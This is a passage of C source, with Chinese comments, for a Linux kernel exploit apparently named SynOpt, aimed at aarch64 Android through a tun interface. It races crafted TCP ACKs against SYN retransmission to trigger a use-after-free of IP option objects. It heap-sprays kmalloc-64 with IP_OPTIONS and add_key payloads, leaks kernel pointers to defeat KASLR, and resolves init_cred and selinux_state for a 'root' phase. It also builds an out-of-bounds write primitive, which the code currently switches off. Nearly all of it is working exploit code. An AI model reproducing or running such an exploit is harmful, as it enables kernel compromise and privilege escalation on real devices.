                say("[clear] 首次 SYNACK 就没有选项：peer=%u ack=%#x gen=%u",
                    s.peer, s.ack, g_spray_gen);
            }
            continue;
        }
        if (s.optlen != (uint8_t)g_optlen) {
            g_hit++;
            *out = s;
            return 1;
        }
        slots[n].sport = sport;
        slots[n].isn = isn;
        slots[n].peer_seq = s.seq;
        n++;
    }
    /* 返回值约定：1 = 命中；0 = 拿到了 SYNACK 但没命中；-1 = 一个都没拿到。
     * 把「通道不通」和「通道通了但没撞上」分开，否则日志会误导。 */
    if (n == 0) return -1;

    /* 等重传定时器就位。SYN 重传用 TCP_TIMEOUT_INIT，约 1 秒。
     *
     * 起点定在 960ms 而不是 880ms：TCP_TIMEOUT_INIT 在 6.6 上是
     * TCP_TIMEOUT_INIT = 1s（HZ 无关），加上请求 sock 入队到定时器
     * 真正挂上还有一点延迟，实际到期点通常在 1s 之后一点点。
     * 从 960ms 起扫能把整个到期点包住，又不至于太早空转。 */
    usleep(960 * 1000);

    /* 预先构造好每个四元组的 ACK 包，循环里只做 sendto，省掉打包开销。 */
    uint8_t acks[RACE_BATCH][128];
    size_t ack_len[RACE_BATCH];
    for (int i = 0; i < n; i++) {
        ack_len[i] = build_pkt(acks[i], slots[i].sport, slots[i].isn + 1,
                               slots[i].peer_seq + 1, 0x10);
    }

    /* 从 960ms 扫到 1360ms，覆盖定时器到期窗口。
     *
     * 分两层：
     *   外层每 1ms 一档，共 400 档 —— 负责覆盖整个 400ms 的不确定范围；
     *   内层在每一档里把整批 ACK 连打 8 遍、不做任何等待 —— 负责在
     *   这一毫秒内尽可能多次命中那个几十微秒的窗口。
     *
     * 之前是每 1ms 只打一次、或者每 200µs 打一次，都太稀：定时器到期
     * 是个瞬间，稀稀拉拉地打，绝大多数 ACK 都落在窗口外。内层连打能让
     * 「ACK 恰好落在定时器读内存的那一刻」的概率提高近一个数量级，
     * 而代价只是多几次 sendto。 */
    for (int round = 0; round < 400; round++) {
        for (int k = 0; k < 8; k++) {
            for (int i = 0; i < n; i++) tx(acks[i], ack_len[i]);
        }
        usleep(1000);
    }

    /* 收这一批的回包。 */
    for (;;) {
        pthread_mutex_lock(&g_ring_lock);
        struct synack s;
        int got = pop(&s);
        pthread_mutex_unlock(&g_ring_lock);
        if (!got) break;
        if (s.optlen == 0) { g_clear++; continue; }
        if (s.optlen == (uint8_t)g_optlen) continue;
        g_hit++;
        *out = s;
        return 1;
    }
    return 0;
}

/* ------------------------------------------------------------ 主流程 */

/* 自检：把构造出来的 SYN 用独立算法重新验证一遍。
 *
 * 校验和错了内核会静默丢弃，表现是 tx 涨但 synack 一直是 0，很难定位。
 * 所以在 probe 阶段先验一次，错了立刻报出来。 */
static int selfcheck_pkt(void) {
    uint8_t pkt[128];
    size_t total = build_pkt(pkt, 12345, 0x11223344, 0, 0x02);
    size_t ihl = (pkt[0] & 0x0f) * 4;

    /* IP 头校验和：把整个头再求一次，结果应为 0。 */
    if (csum_fold(csum_raw(pkt, ihl)) != 0) {
        say("[selfcheck] IP 头校验和错误");
        return 1;
    }
    /* TCP：伪头 + 段一起求，结果应为 0。 */
    uint8_t ph[12];
    memcpy(ph, pkt + 12, 8);
    ph[8] = 0;
    ph[9] = 6;
    *(uint16_t *)(ph + 10) = htons((uint16_t)(total - ihl));
    uint32_t sum = csum_raw(ph, 12) + csum_raw(pkt + ihl, total - ihl);
    if (csum_fold(sum) != 0) {
        say("[selfcheck] TCP 校验和错误（内核会静默丢弃这些包）");
        return 1;
    }
    say("[selfcheck] 报文校验和正确（IP 头 + TCP 伪头）");
    return 0;
}

static int phase_probe(void) {
    if (selfcheck_pkt() != 0) return 1;
    for (int i = 0; i < 5; i++) {
        uint16_t sport;
        uint32_t isn;
        struct synack s;
        if (!syn_round(&sport, &isn, &s)) {
            say("probe %d: 没收到 SYNACK（累计 g_rx=%lu）", i, g_rx);
            continue;
        }
        if (s.optlen != (uint8_t)g_optlen) {
            say("probe %d: 选项长度 %u（预期 %d）", i, s.optlen, g_optlen);
            continue;
        }
        say("probe %d: 选项 %u 字节原样返回，标记 %02x%02x", i, s.optlen, s.opts[3], s.opts[4]);
        complete(sport, isn, s.seq);
        return 0;
    }
    return 1;
}

struct hit_ctx {
    uint16_t sport;
    uint32_t isn;
    struct synack s;
};

/* ------------------------------------------------------ 泄露解析 */

/* 喷射对象里我们写死的标记：build_opts 把 tag 放在 opts[3..6]。
 * 复用发生后，SYNACK 的选项区就是这份数据的拷贝，所以看 opts[3..6] 即可。 */
#define SPRAY_TAG0 0x53

static int is_spray_tag(const struct synack *s) {
    return s->optlen >= 7 && s->opts[3] == SPRAY_TAG0;
}

/* 把回读到的选项区按 8 字节一组打印，方便人工判断是残留堆还是我们的对象。 */
static void dump_opts(const struct synack *s) {
    char line[192];
    int off = 0;
    off += snprintf(line + off, sizeof(line) - off, "  opts[%u]:", s->optlen);
    for (int i = 0; i < s->optlen && i < 48; i++) {
        off += snprintf(line + off, sizeof(line) - off, " %02x", s->opts[i]);
        if ((i + 1) % 16 == 0 && i + 1 < s->optlen) {
            say("%s", line);
            off = snprintf(line, sizeof(line), "           ");
        }
    }
    if (off > 0) say("%s", line);
}

/* 从回读数据里挑出像内核 .text 指针的 8 字节（KASLR 基址候选）。
 *
 * 只做“看起来像”的判断：aarch64 内核线性映射在 0xffff8... 到 0xffffc...
 * 之间，且低 12 位通常是页对齐。真正的基址换算要靠 offsets 表。 */
static int find_text_candidates(const struct synack *s, uint64_t *out, int max) {
    int n = 0;
    for (int i = 0; i + 8 <= s->optlen && n < max; i += 8) {
        uint64_t v = 0;
        memcpy(&v, s->opts + i, 8);
        if ((v >> 48) != 0xffff) continue;
        if ((v & 0xfff) != 0) continue;
        out[n++] = v;
    }
    return n;
}

/* 竞态：一边持续喷淋占位，一边把 ACK 与重传 SYN 对撞。
 *
 * 顺序很重要 —— 必须在喷淋已经跑起来之后再放 ACK，否则释放出来的槽位
 * 还是空的，回读到的是残留堆（或者根本读不到）。
 *
 * 另一件同样重要的事：重传路径的 SYNACK 带的是**本轮**的源端口，
 * 而下一轮 syn_round 会换一个随机端口。所以命中必须在 fire_pair 之后
 * 用 drain_for 当场收走，等下一轮再看就永远看不到。 */
static int phase_race(struct hit_ctx *hit) {
    if (selfcheck_pkt() != 0) return 1;

    int found = 0;
    int blind = 0;

    /* 用 IP_OPTIONS 喷淋，长度 24。
     *
     * 之前失败是因为用 40 字节：ip_options_get 分配 0x20+40 = 72，
     * 落在 kmalloc-96，而漏洞对象是 optlen+12 = 52，在 kmalloc-64，
     * 差一个桶，喷得再勤也占不到。改成 24 字节后 0x20+24 = 56，
     * 和漏洞对象同桶。
     *
     * 用 IP_OPTIONS 而不是 add_key 还有个好处：喷出来的对象就是真正的
     * ip_options_rcu，布局和漏洞对象逐字节一致（+0x18 optlen、+0x20 __data），
     * 不用再靠估算去凑偏移。 */
    g_spray_kind = SPRAY_IPOPT;
    say("[spray] IP_OPTIONS %d 字节 → 分配 %d → kmalloc-64（漏洞对象 optlen+12=%d）",
        SPRAY_OPTLEN, 0x20 + SPRAY_OPTLEN, g_optlen + 12);
    /* IP_OPTIONS 喷出来的对象，optlen 字段就是选项长度 24，不需要额外写。
     *
     * 这正好满足命中判据「回来的长度 != 发出去的 40」：24 和 40 差得远，
     * 一眼能认出来。之前用 add_key 时 g_fake_optlen 默认等于 40，
     * 判据恒假，是 hit 一直为 0 的另一个独立原因。 */
    say("[spray] 命中判据：回来的选项长度 != %d（喷淋对象是 %d）",
        g_optlen, SPRAY_OPTLEN);
    {
        long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
        say("[cpu] 在线核心 %ld 个（未绑核，靠调度器分散）",
            ncpu > 0 ? ncpu : 1);
    }
    say("开始竞态：每批 %d 个四元组并行，最多 %d 批（每批等一次重传定时器）",
        RACE_BATCH, g_rounds);
    spray_start();

    struct race_slot slots[RACE_BATCH];
    for (int b = 0; b < g_rounds && !found; b++) {
        struct synack s;
        int got = race_batch(slots, RACE_BATCH, &s);
        if (got == 1) {
            say("命中 b=%d optlen=%u gen=%u", b, s.optlen, g_spray_gen);
            dump_opts(&s);
            hit->s = s;
            found = 1;
            break;
        }
        if (got < 0) {
            g_none++;
            /* 连续 10 批一个 SYNACK 都没收到，说明通道根本不通。 */
            if (++blind >= 10) {
                say("[!] 连续 %d 批收不到任何 SYNACK，判定通道不通", blind);
                say("[!] 检查：端口 %u 是否在 %u.%u.%u.%u 上 listen、tun 是否收到包",
                    g_port, g_dst & 0xff, (g_dst >> 8) & 0xff,
                    (g_dst >> 16) & 0xff, (g_dst >> 24) & 0xff);
                dump_trace();
                say("[!] 回到 tun 的 TCP 包共 %lu 个，其中 RST %lu 个；回给我们端口的 %lu 个（RST %lu）",
                    g_tcp_other, g_rst_seen, g_tcp_other_to_us, g_rst_to_us);
                if (g_rst_to_us > 0) {
                    say("[!] 诊断：内核回了 RST —— 包进了 TCP 层，但没有 socket 接住这个 SYN");
                } else if (g_tcp_other_to_us > 0) {
                    say("[!] 诊断：有 TCP 回包但都不是 SYN+ACK，看上面的 flags");
                } else {
                    say("[!] 诊断：TCP 层没有回任何东西 —— SYN 很可能在 IP 层就被丢了");
                }
                spray_stop();
                return 1;
            }
            continue;
        }
        blind = 0;
        listen_drain();
        if (g_verbose)
            say("b=%d synack=%lu hit=%lu clear=%lu none=%lu spray_gen=%u",
                b, g_synack, g_hit, g_clear, g_none, g_spray_gen);
    }
    if (!found) spray_stop();
    return found ? 0 : 1;
}

/* 泄露：命中的 SYNACK 本身就是回读结果，不需要再发包。
 *
 * 这里刻意不发 ACK/RST：那个请求 sock 的 ireq_opt 可能已经指向我们的
 * 喷射对象，再走一次 inet_sock_destruct 就是 double free，在
 * PANIC_ON_OOPS=y 的机器上直接重启。 */
static int phase_leak(struct hit_ctx *hit) {
    /* complete_ack_only 保留给以后需要的阶段 */
    say("回读命中对象：");
    dump_opts(&hit->s);

    /* 喷淋在命中时已经停了；这里只做判定，不再动它。 */
    uint64_t cand[8];
    int n = find_text_candidates(&hit->s, cand, 8);
    if (is_spray_tag(&hit->s)) {
        say("对象已被喷淋占据（标记 0x%02x），说明复用成功", SPRAY_TAG0);
        say("但内容是我们自己写的，没有泄露价值；下一轮要靠残留堆读内核指针");
        return 1;
    }
    if (n > 0) {
        for (int i = 0; i < n; i++) say("  内核指针候选[%d] = %#llx", i, (unsigned long long)cand[i]);
        return 0;
    }
    say("没有挑出内核指针候选（optlen=%u）", hit->s.optlen);
    return 1;
}

/* ============================================================ root 阶段
 *
 * ---- 写原语的来源 ----
 *
 * ip_build_and_send_pkt 对同一个 opt 读了两次 optlen（见 synopt_offsets.h）：
 *   第一次 → 决定 skb_push 预留多少 headroom；
 *   第二次 → 作为 ip_options_build 里 memcpy 的长度。
 * 两次之间隔着 skb_push，没有加锁。让两次读到不同的值，memcpy 就写穿预留区。
 *
 * ---- 怎么让两次读到不同的值 ----
 *
 * 关键：找一个同样落在 kmalloc-64、而且能把数据写到 optlen 那个位置的对象。
 *
 *   struct ip_options_rcu          user_key_payload（add_key "user" 类型）
 *   +0x00 rcu_head (16)            +0x00 rcu_head (16)
 *   +0x10 struct ip_options        +0x10 datalen (u16)
 *   +0x18 optlen   (u8)      <---> +0x18 data[0]      ← 完全重合
 *   +0x20 __data[40]         <---> +0x20 data[8..]    ← 完全重合
 *
 * user_preparse 里是 __kmalloc(datalen + 0x18)，datalen=72 时正好 96 字节，
 * 落进 kmalloc-64。于是：
 *   data[0]  = 我们想要的假 optlen（比如 56）
 *   data[8..]= 我们想要的 __data 内容
 *
 * 对象被释放后，用 add_key 喷一批，槽位被 user_key_payload 占住；重传 SYN
 * 那条路径第二次读 optlen 就拿到 56，memcpy 写穿 16 字节。
 *
 * ---- 为什么默认不启用 ----
 *
 * CONFIG_PANIC_ON_OOPS=y，写错一个字节就是重启。所以这个阶段：
 *   - 只解基址、只打印要用的地址（不写内核）；
 *   - 真要发写请求必须显式 --allow-write；
 *   - 越界长度控制在 16 字节，不跨页。
 */

static uint64_t g_base;          /* 内核 _text 基址 */

/* ---- 基址求解 ----
 *
 * 泄露阶段给出的是 .text 里的地址候选，但不知道它具体是哪个符号。
 * 用自洽性检查：候选 - 已知站点偏移 必须落在 2MiB 对齐的 _text 上
 * （KASLR slide 是 2MiB 粒度），且仍在 ffffff80.. 段内。 */
struct site {
    const char *name;
    uint64_t off;
};

static const struct site g_sites[] = {
    {"ip_options_build",        O_IP_OPTIONS_BUILD},
    {"ip_build_and_send_pkt",   O_IP_BUILD_AND_SEND_PKT},
    {"tcp_v4_send_synack",      O_TCP_V4_SEND_SYNACK},
    {"tcp_v4_syn_recv_sock",    O_TCP_V4_SYN_RECV_SOCK},
    {"inet_csk_route_req",      O_INET_CSK_ROUTE_REQ},
    {"inet_sock_destruct",      O_INET_SOCK_DESTRUCT},
    {"tcp_v4_reqsk_destructor", O_TCP_V4_REQSK_DESTRUCTOR},
    {"tcp_make_synack",         O_TCP_MAKE_SYNACK},
};

#define N_SITES (sizeof(g_sites) / sizeof(g_sites[0]))
#define KASLR_ALIGN 0x200000ULL

static int solve_base(const uint64_t *cand, int n) {
    for (int i = 0; i < n; i++) {
        for (unsigned j = 0; j < N_SITES; j++) {
            if (cand[i] < g_sites[j].off) continue;
            uint64_t base = cand[i] - g_sites[j].off;
            if ((base & (KASLR_ALIGN - 1)) != 0) continue;
            if ((base >> 40) != 0xffffffULL) continue;
            say("[base] 候选 %#llx 命中站点 %s", (unsigned long long)cand[i], g_sites[j].name);
            say("[base] _text = %#llx", (unsigned long long)base);
            g_base = base;
            return 0;
        }
    }
    return 1;
}

/* ---- 写原语说明 ---- */

static void report_write_plan(void) {
    say("[write] 假对象 optlen = %d（第一次预留按 40 算，memcpy 会写 %d 字节）",
        WRITE_OPTLEN, WRITE_OPTLEN);
    say("[write] 越界 = %d 字节，落在 skb 线性数据之后", WRITE_OPTLEN - OPT_MAXLEN);
    say("[write] 目的地址由内核算：skb->head + network_header + 20");
    say("[write] 对象来源：add_key(user) datalen=%d → 共 %d 字节 → kmalloc-64", KEY_DATALEN, 0x18 + KEY_DATALEN);
    say("[write] optlen 位置 +0x18 与 user_key_payload.data[0] 重合");
}

static int phase_root(struct hit_ctx *hit) {
    say("root 阶段：解 _text 基址");

    uint64_t cand[8];
    int n = find_text_candidates(&hit->s, cand, 8);
    if (n == 0) {
        say("[!] 没有内核指针候选；先跑 leak 拿到候选再来");
        return 1;
    }
    for (int i = 0; i < n; i++) say("  候选[%d] = %#llx", i, (unsigned long long)cand[i]);
    if (solve_base(cand, n) != 0) {
        say("[!] 候选对不上已知站点，基址解不出来");
        return 1;
    }

    say("[OK] slide = %#llx", (unsigned long long)(g_base - 0xffffffc080000000ULL));
    say("[sym] ip_options_build      = %#llx", (unsigned long long)(g_base + O_IP_OPTIONS_BUILD));
    say("[sym] ip_build_and_send_pkt = %#llx", (unsigned long long)(g_base + O_IP_BUILD_AND_SEND_PKT));
    say("[sym] init_task             = %#llx", (unsigned long long)(g_base + O_INIT_TASK));
    say("[sym] init_cred             = %#llx", (unsigned long long)(g_base + O_INIT_CRED));
    say("[sym] selinux_state         = %#llx", (unsigned long long)(g_base + O_SELINUX_STATE));

    report_write_plan();

    /* 先验证 add_key 这条路通不通，不管开不开启写入。 */
    int made = key_spray(WRITE_OPTLEN, 0x53570000u);
    if (made < 0) {
        say("[!] add_key 不可用，写原语无法构造");
        return 1;
    }
    say("[key] 喷了 %d 个 user key（每个 %d 字节，kmalloc-64）", made, 0x18 + KEY_DATALEN);
    key_spray_free();
    say("[key] 已释放");

    if (!g_allow_write) {
        /* 只探测模式到这里就算完成：基址解出来了、add_key 通路验证过了。
         * 返回 0 让上层知道“探测成功”，而不是“失败”。 */
        say("[OK] 探测完成（未写内核）。要真的写请选「允许写入」");
        return 0;
    }

    /* 真正的写：把喷淋源换成 add_key，再打一轮竞态。
     *
     * 这一轮里被释放的槽位会被 user_key_payload 占住（data[0]=WRITE_OPTLEN），
     * 重传 SYN 那条路径第二次读 optlen 就拿到 56，memcpy 写穿 16 字节。 */
    say("[write] 开启写入：喷淋源切到 add_key，重新打一轮竞态");
    g_spray_kind = SPRAY_KEY;
    g_fake_optlen = WRITE_OPTLEN;

    struct hit_ctx w;
    int rc = phase_race(&w);
    if (rc != 0) {
        say("[write] 没命中，内核没有被写");
        key_spray_free();
        g_spray_kind = SPRAY_IPOPT;
        return 1;
    }
    say("[write] 命中：越界写已发生（%d 字节）", WRITE_OPTLEN - OPT_MAXLEN);
    say("[write] 现在内核里多了 16 字节脏数据；请检查 dmesg 是否报错");
    key_spray_free();
    g_spray_kind = SPRAY_IPOPT;
    return 0;
}

int main(int argc, char **argv) {
    const char *phase = "race";
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--tun-fd") && i + 1 < argc) g_tun = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--target") && i + 1 < argc) g_dst = inet_addr(argv[++i]);
        else if (!strcmp(argv[i], "--src") && i + 1 < argc) g_src = inet_addr(argv[++i]);
        else if (!strcmp(argv[i], "--port") && i + 1 < argc) g_port = (uint16_t)atoi(argv[++i]);
        else if (!strcmp(argv[i], "--rounds") && i + 1 < argc) g_rounds = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--phase") && i + 1 < argc) phase = argv[++i];
        else if (!strcmp(argv[i], "--ip-options") && i + 1 < argc) g_optlen = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--listen-fd") && i + 1 < argc) g_listen_fd_in = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--verbose")) g_verbose = 1;
        /* 写路径暂时硬关闭：用户实测出现重启循环，在写原语定向到 cred
         * 之前不能真的动内核。参数保留但不再生效，避免旧脚本误开。 */
        else if (!strcmp(argv[i], "--allow-write")) g_allow_write = 0;
    }

    srand((unsigned)time(NULL) ^ (unsigned)getpid());
    if (g_tun < 0) { FAIL("缺少 --tun-fd"); return 2; }
    say("synopt: release=%s tun=%d dst=%08x port=%u phase=%s", SYNOPT_RELEASE, g_tun, g_dst, g_port, phase);

    /* 先探路：监听 socket 要用 g_tun_if 钉网卡，所以必须在 listen_open 之前。 */
    probe_route();

    /* 监听 socket 优先用 Kotlin 传进来的那个（已绑到 VPN 网络）。
     *
     * 为什么必须这样：SYNACK 的选路用的是监听 socket 所属网络的路由表。
     * 载荷自己建的 socket 归属应用默认网络（wifi），查不到 10.7.7.0/24，
     * inet_csk_route_req() 返回 NULL，SYNACK 被静默丢弃 —— 实测日志里
     * 「到 10.7.7.99 有路由但选的本机源地址是 192.168.1.7」就是证据。
     * Kotlin 侧 Network.bindSocket() 是显式绑定，路由域确定。
     *
     * 没有监听套接字内核就不会为 SYN 建请求 sock，所以这条不能省。 */
    if (g_listen_fd_in >= 0) {
        g_listen_fd = g_listen_fd_in;
        int fl = fcntl(g_listen_fd, F_GETFL, 0);
        if (fl >= 0) fcntl(g_listen_fd, F_SETFL, fl | O_NONBLOCK);
        /* 回读一下：继承来的 fd 未必是我们要的那个端口/地址。 */
        struct sockaddr_in b;
        socklen_t bl = sizeof(b);
        if (getsockname(g_listen_fd, (struct sockaddr *)&b, &bl) == 0) {
            const uint8_t *p = (const uint8_t *)&b.sin_addr.s_addr;
            say("[listen] 使用 Kotlin 传来的 fd=%d，实际监听 %u.%u.%u.%u:%u",
                g_listen_fd, p[0], p[1], p[2], p[3], ntohs(b.sin_port));
        } else {
            say("[listen] 使用 Kotlin 传来的 fd=%d（getsockname 失败 errno=%d）",
                g_listen_fd, errno);
        }
    } else {
        g_listen_fd = listen_open(g_port);
    }
    if (g_listen_fd < 0) {
        FAIL("监听端口失败，无法进入 tcp_conn_request");
        return 2;
    }

    pthread_t th;
    if (pthread_create(&th, NULL, reader, NULL) != 0) { FAIL("读线程起不来"); return 2; }

    /* 先确认 tun 的投递方向通不通，再谈 TCP。
     *
     * 即使 ICMP 不通也继续跑一小段 TCP：万一只是 ICMP 被过滤，TCP 反而能通，
     * 这样一次运行就能同时拿到两个判据，不用再来一轮。 */
    if (channel_selftest() != 0) {
        say("[!] 通道自检失败，仍用缩短的轮数跑一段 TCP 以收集对照数据");
        if (g_rounds > 50) g_rounds = 50;
    }

    /* 第零刀（最便宜）：用本机 socket 验"带选项的 SYN 到底能不能进内核"。
     * 这一步和 tun 完全无关，先做，省得把通道问题和选项问题混在一起。 */
    if (g_optlen != 0) {
        int local = probe_local_connect();
        if (local == 2) {
            say("[!] 结论：内核不接受带 IP 选项的 SYN，SynOpt 的漏洞入口在本机不成立");
            say("[!] 已中止，未做任何写操作");
            g_running = 0;
            if (g_listen_fd >= 0) { close(g_listen_fd); g_listen_fd = -1; }
            pthread_join(th, NULL);
            return 6;
        }
        if (local == 1) {
            say("[!] 本机 TCP 自连都不通，无法判断选项问题；继续跑 tun 侧观察");
        }
    }

    /* 补充探针：带选项的 ICMP 能不能回。
     *
     * ICMP 走的是另一条收包分支，它拒绝不代表 TCP 也拒绝，所以只报警
     * 不中止 —— 真正的判据是后面的 control_no_options（直接打 TCP）。 */
    if (g_optlen != 0) {
        if (probe_ipopt_icmp() != 0) {
            say("[!] 注意：带选项的 ICMP 没回来，但仍继续测 TCP（判据以 control 为准）");
        }
    }

    /* 第一刀：TCP 这条路通不通。闭端口应该回 RST。 */
    int closed_ok = (probe_closed_port() == 0);
    if (!closed_ok) {
        say("[!] 连 RST 都收不到：包没进 TCP 层，或者回包没回到 tun");
        say("[!] 这一步不通，后面所有 SYNACK 相关的判断都没有意义");
        dump_trace();
        g_running = 0;
        if (g_listen_fd >= 0) { close(g_listen_fd); g_listen_fd = -1; }
        pthread_join(th, NULL);
        return 4;
    }

    /* 关键对照：不带 IP 选项的 SYN 能不能拿到 SYNACK。
     *
     * 这一步把「TCP 通道不通」和「IP 选项被内核拒绝」彻底分开。之前
     * synack 一直是 0，两个原因都说得通，白跑了好几轮。 */
    probe_listener_state();
    probe_self_connect();
    probe_accept_queue();

    if (g_optlen != 0) {
        int ctl = control_no_options();
        if (ctl != 0) {
            dump_trace();
            if (ctl == 1) {
                say("[!] 结论：不带 IP 选项的 TCP 也拿不到 SYNACK —— 问题在通道或监听");
                say("[!] 先查：10.7.7.0/24 是否真的路由进 tun、SYN 是否进了 tcp_v4_rcv");
            } else {
                say("[!] 结论：通道正常，但内核不接受带 IP 选项的入站 SYN");
            }
            say("[!] 本阶段中止（不带选项硬跑下去只会浪费时间）");
            g_running = 0;
            if (g_listen_fd >= 0) { close(g_listen_fd); g_listen_fd = -1; }
            pthread_join(th, NULL);
            return 3;
        }
        say("[OK] 对照通过：带选项的 SYN 能拿到 SYNACK");
    }

    int rc;
    if (!strcmp(phase, "probe")) {
        rc = phase_probe();
    } else {
        struct hit_ctx hit;
        rc = phase_race(&hit);
        if (rc == 0 && !strcmp(phase, "leak")) {
            rc = phase_leak(&hit);
        } else if (rc == 0 && !strcmp(phase, "root")) {
            /* root 阶段：先解基址，再按 --allow-write 决定是否真的写。 */
            rc = phase_root(&hit);
        }
    }

    dump_trace();
    if (g_raw_first_len) {
        char line[256];
        int off = snprintf(line, sizeof(line), "首包 proto=%u len=%zu:", g_raw_proto, g_raw_first_len);
        for (size_t i = 0; i < g_raw_first_len && i < 48; i++)
            off += snprintf(line + off, sizeof(line) - off, " %02x", g_raw_first[i]);
        say("%s", line);
    }
    say("统计: tx=%lu rx=%lu synack=%lu hit=%lu clear=%lu none=%lu raw=%lu icmp=%lu",
        g_tx, g_rx, g_synack, g_hit, g_clear, g_none, g_raw_rx, g_icmp_rx);
    say("      回到 tun 的 TCP=%lu RST=%lu 对不上的 SYNACK=%lu",
        g_tcp_other, g_rst_seen, g_mismatch);
    say("      回给我们端口的 TCP=%lu（其中 RST %lu）", g_tcp_other_to_us, g_rst_to_us);
    say("      ICMP: echo-reply=%lu param-problem=%lu unreach=%lu",
        g_icmp_echo_reply, g_icmp_param_prob, g_icmp_unreach);
    g_running = 0;
    if (g_listen_fd >= 0) { close(g_listen_fd); g_listen_fd = -1; }
    pthread_join(th, NULL);
    if (rc == 0) say("OK");
    return rc;
}
